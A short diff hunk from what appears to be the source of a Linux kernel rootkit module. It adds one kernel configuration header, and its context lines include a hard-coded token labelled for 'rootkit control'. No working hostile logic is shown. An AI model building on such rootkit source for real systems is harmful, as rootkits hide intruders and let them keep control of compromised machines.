@@ -5,6 +5,7 @@
 #include <linux/slab.h>
 #include <linux/list.h>
 #include <linux/fs.h>
+#include <generated/autoconf.h>
 
 #define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
 #define __DEBUG__ 1             // General debugging statements
